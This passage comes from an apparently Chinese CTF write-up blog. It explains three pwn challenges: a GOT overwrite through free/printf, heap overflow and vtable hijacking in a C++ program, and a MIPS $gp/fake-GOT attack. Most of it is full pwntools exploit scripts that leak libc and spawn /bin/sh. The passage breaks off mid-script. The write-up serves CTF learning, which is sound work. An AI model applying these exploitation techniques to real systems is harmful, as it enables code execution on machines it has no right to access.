修改为<code>printf</code>, 利用格式化字符串  , 泄露出<code>libc</code>.</li>\n<li>重复 1 的步骤 , 把这个堆块 重新申请回来. 因为当时<code>free</code> 被修改为了 <code>printf</code>, 所以不能直接申请 ,  得重复1 的步骤.</li>\n<li>这一次把free修改为system , 然后把堆块内容设置为<code>/bin/sh\\x00</code></li>\n</ol>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">port=<span class=\"number\">0</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./chall&quot;</span>,url,port)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pr_c</span>(<span class=\"params\">r,l,c</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"string\">b&quot;p&quot;</span>)</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(r))</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(l))</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">hex</span>(c)[<span class=\"number\">2</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">re_c</span>(<span class=\"params\">r,l</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"string\">b&quot;r&quot;</span>)</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(r))</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(l))\t</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401605&quot;</span>)</span><br><span class=\"line\">pr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x290</span>,<span class=\"number\">0x1</span>)</span><br><span class=\"line\">bss=<span class=\"number\">0x404070</span></span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> bss &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x210</span>+i,bss &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\ti+=<span class=\"number\">1</span></span><br><span class=\"line\">\tbss&gt;&gt;=<span class=\"number\">8</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">re_c(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">printf=<span class=\"number\">0x401100</span></span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x70</span>+i,printf &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\tprintf&gt;&gt;=<span class=\"number\">8</span>\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">pay=<span class=\"string\">b&quot;%17$p&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i,j <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pay):</span><br><span class=\"line\">    pr_c(<span class=\"number\">0</span>, i, j) </span><br><span class=\"line\">re_c(<span class=\"number\">20</span>,<span class=\"number\">20</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">libc_base=leak-<span class=\"number\">0x2a1ca</span></span><br><span class=\"line\">system=libc_base+<span class=\"number\">0x58750</span> </span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"></span><br><span class=\"line\">pr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x290</span>,<span class=\"number\">0x1</span>)</span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\">bss=<span class=\"number\">0x404070</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> bss &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x210</span>+i,bss &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\ti+=<span class=\"number\">1</span></span><br><span class=\"line\">\tbss&gt;&gt;=<span class=\"number\">8</span></span><br><span class=\"line\">re_c(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x70</span>+i,system &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\tsystem&gt;&gt;=<span class=\"number\">8</span>\t</span><br><span class=\"line\">pay=<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i,j <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pay):</span><br><span class=\"line\">    pr_c(<span class=\"number\">0</span>, i, j)\t</span><br><span class=\"line\">re_c(<span class=\"number\">20</span>,<span class=\"number\">20</span>)\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"learning-oop\"><a href=\"#learning-oop\" class=\"headerlink\" title=\"learning_oop\"></a>learning_oop</h2><h3 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901194344121.png\" alt=\"图3\"></p>\n<p>首先漏洞点 ,  很明显是<code>set_name</code> 函数中的溢出漏洞 , 可以往下溢出覆盖下面的堆块. 然后堆块申请都是固定大小<code>0x120</code></p>\n<p>可以看到这是一个<code>c++</code>的程序 ,  他的堆块都是 作为对象申请的. 这里应该是 用 <code>Animal</code> 这样一个类 , 然后 <code>Dog</code>,<code>Cat</code>,<code>Horse</code>,<code>Parrot</code> 类继承了<code>Animal</code>,并对其中的某些方法重写了.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901203517642.png\" alt=\"image.png\"></p>\n<p>在初始化一个动物的时候 , 在<code>fd</code> 的位置 写了一个虚表的地址 ,后续的函数调用都是靠这个地址去寻找和调用函数.</p>\n<p>年龄,饥饿值,体力,其实是堆块最后<code>0x10</code>字节保存的数据. 同时 ,  意识到 ,  可以溢出修改这个部分 , 去控制 动物的 这些信息.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901204229246.png\"></p>\n<p>这里 可以通过控制 <code>fd</code> 也就是劫持虚表 ,  来完成调用自己想要的函数.</p>\n<h3 id=\"思路分析-1\"><a href=\"#思路分析-1\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><p>题目环境是2.39的libc . (没有版本讲堆题,都是在耍流氓)</p>\n<ol>\n<li>首先要泄露<code>libc</code> , 然后劫持虚表 , 这里应该是很容易想到的. 那么如何泄露<code>libc</code>呢? 肯定是通过<code>unsorted bin</code> 了. 然后让堆块进入<code>unsorted bin</code>呢? 如果填满一个<code>tcache bins</code> , 再 <code>free</code> 一个<code>0x120</code> 的堆块, 看样子可行,但可以没有<code>uaf</code> 漏洞,这样利用会很困难. 所以 , 通过溢出修改堆块 的<code>size</code> 造一个0x481 的堆块 ,  造一个重叠. 因为这个大小的堆块超过了<code>tcahce bins</code>的大小会直接进入<code>unsorted bin</code>.</li>\n<li>这个时候 再申请一个堆块 , <code>arena</code>信息就会写入到下一个堆块的<code>name</code>的位置, 如果此时下一个堆块恰好<code>die</code> ,就会触发<code>get_name</code> 把信息泄露出来.</li>\n<li>然后劫持<code>vtable</code> ,我们通过在堆上布置一个虚表,在创建成功后,程序会返回堆的地址. 然后只要有合适的<code>gadgets</code>, 就可以调用<code>system</code>. 这里肯定需要的是控制<code>rdi</code>, 同时需要<code>call</code></li>\n</ol>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./learning_oop&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">op</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">species,name</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;4=Horse): &quot;</span>,<span class=\"built_in\">str</span>(species))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Enter name: \\n&quot;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">play</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Which pet? \\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">feed</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Which pet? \\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reset</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Which pet? \\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">6</span>)+p32(<span class=\"number\">6</span>))</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">7</span>)+p32(<span class=\"number\">7</span>))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">6</span>)+p32(<span class=\"number\">6</span>))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">4</span>)+p32(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">2</span>)+p32(<span class=\"number\">2</span>))</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">0x10</span>)+p32(<span class=\"number\">0x10</span>)+<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x481</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">io.recvlines(<span class=\"number\">1</span>)</span><br><span class=\"line\">arena=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;arena&quot;</span>,<span class=\"built_in\">hex</span>(arena))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = arena - <span class=\"number\">0x203b20</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">题目的</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001cb42f : /bin/sh</span></span><br><span class=\"line\"><span class=\"string\">0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]</span></span><br><span class=\"line\"><span class=\"string\">我的</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001d8678 : /bin/sh</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">bin_sh=libcbase+<span class=\"number\">0x1cb42f</span></span><br><span class=\"line\">set_rdi=libcbase+<span class=\"number\">0x9ca97</span></span><br><span class=\"line\">system=libcbase+<span class=\"number\">0x582d2</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;bin_sh&quot;</span>,<span class=\"built_in\">hex</span>(bin_sh))</span><br><span class=\"line\"><span class=\"comment\">##  这里的偏移需要对这gdb去找</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>,p64(set_rdi)*<span class=\"number\">4</span>+<span class=\"string\">b&quot;W&quot;</span>*<span class=\"number\">0xe0</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>)+p64(<span class=\"number\">3</span>)+p64(<span class=\"number\">0xd281</span>)+<span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">0x520</span>-<span class=\"number\">0x128</span>)+p64(system)+p64(bin_sh))<span class=\"comment\">#+p64(bin_sh))</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Adopted new pet: &quot;</span>)</span><br><span class=\"line\">vtable=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)+<span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">logv(<span class=\"string\">&quot;vtable&quot;</span>,<span class=\"built_in\">hex</span>(vtable))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,p64(set_rdi)*<span class=\"number\">8</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *$rebase(0x143C)&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>)+p64(<span class=\"number\">3</span>)+p64(<span class=\"number\">0x121</span>)+p64(vtable))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"outdated\"><a href=\"#outdated\" class=\"headerlink\" title=\"outdated\"></a>outdated</h2><h3 id=\"ida分析-2\"><a href=\"#ida分析-2\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><h3 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> getoutput</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># initialize the binary</span></span><br><span class=\"line\">build = <span class=\"string\">&#x27;mipsel32r6-musl&#x27;</span></span><br><span class=\"line\">binary = <span class=\"string\">&quot;./outdated&quot;</span></span><br><span class=\"line\">elf = context.binary = ELF(binary, checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">docker = ELF(<span class=\"string\">&#x27;/usr/bin/docker&#x27;</span>,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gs = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">set architecture mips:isa32r6</span></span><br><span class=\"line\"><span class=\"string\">break *main+536</span></span><br><span class=\"line\"><span class=\"string\">continue</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args.REMOTE:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;outdated.chals.sekai.team&quot;</span>, <span class=\"number\">1337</span>, ssl=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">### SOLVE POW ###</span></span><br><span class=\"line\">    cmd = p.recvline().decode().strip().removeprefix(<span class=\"string\">&quot;proof of work: &quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Solving POW: <span class=\"subst\">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class=\"line\">    answer = getoutput(cmd)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;solution: &quot;</span>, answer.encode())</span><br><span class=\"line\"><span class=\"keyword\">elif</span> args.GDB:</span><br><span class=\"line\">    context.terminal = [<span class=\"string\">&quot;tmux&quot;</span>, <span class=\"string\">&quot;splitw&quot;</span>, <span class=\"string\">&quot;-h&quot;</span>, <span class=\"string\">&quot;-l&quot;</span>, <span class=\"string\">&quot;65%&quot;</span>]</span><br><span class=\"line\">    p = docker.process([<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"string\">&#x27;-i&#x27;</span>,<span class=\"string\">&#x27;--rm&#x27;</span>,<span class=\"string\">&#x27;-v&#x27;</span>,<span class=\"string\">&#x27;./:/target/ctf&#x27;</span>,<span class=\"string\">&#x27;-p&#x27;</span>,<span class=\"string\">&#x27;1234:1234&#x27;</span>,<span class=\"string\">f&#x27;legoclones/mips-pwn:<span class=\"subst\">&#123;build&#125;</span>&#x27;</span>,<span class=\"string\">&#x27;chroot&#x27;</span>,<span class=\"string\">&#x27;/target&#x27;</span>,<span class=\"string\">&#x27;/qemu&#x27;</span>,<span class=\"string\">&#x27;-g&#x27;</span>,<span class=\"string\">&#x27;1234&#x27;</span>,<span class=\"string\">&#x27;/ctf/outdated&#x27;</span>])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Remote debugging started...&quot;</span>)</span><br><span class=\"line\">    gdb.attach((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">1234</span>), gdbscript=gs, exe=binary)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = docker.process([<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"string\">&#x27;-i&#x27;</span>,<span class=\"string\">&#x27;--rm&#x27;</span>,<span class=\"string\">&#x27;-v&#x27;</span>,<span class=\"string\">&#x27;./:/target/ctf&#x27;</span>,<span class=\"string\">f&#x27;legoclones/mips-pwn:<span class=\"subst\">&#123;build&#125;</span>&#x27;</span>,<span class=\"string\">&#x27;chroot&#x27;</span>,<span class=\"string\">&#x27;/target&#x27;</span>,<span class=\"string\">&#x27;/qemu&#x27;</span>,<span class=\"string\">&#x27;/ctf/outdated&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GET EXE LEAK ###</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;Here&#x27;</span>)</span><br><span class=\"line\">main_addr = <span class=\"built_in\">int</span>(p.recvline().strip().split(<span class=\"string\">b&#x27; &#x27;</span>)[-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;main() = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(main_addr)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GP OVERWRITE 1 ###</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">(using example addresses)</span></span><br><span class=\"line\"><span class=\"string\">old $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0</span></span><br><span class=\"line\"><span class=\"string\">new $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Our goal is to turn puts(&quot;Thanks for playing&quot;) into puts_blue(GOT[puts])</span></span><br><span class=\"line\"><span class=\"string\">and exit(0) into main(0)</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">fake_got1 = flat(</span><br><span class=\"line\">    <span class=\"comment\"># 0xf900c0</span></span><br><span class=\"line\">    p32(main_addr + <span class=\"number\">0x1f6ac</span> - <span class=\"number\">0x118c</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># GOT[puts] - main = 0x1f6ac (offset for &quot;Thanks&quot; string)</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900d0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\">  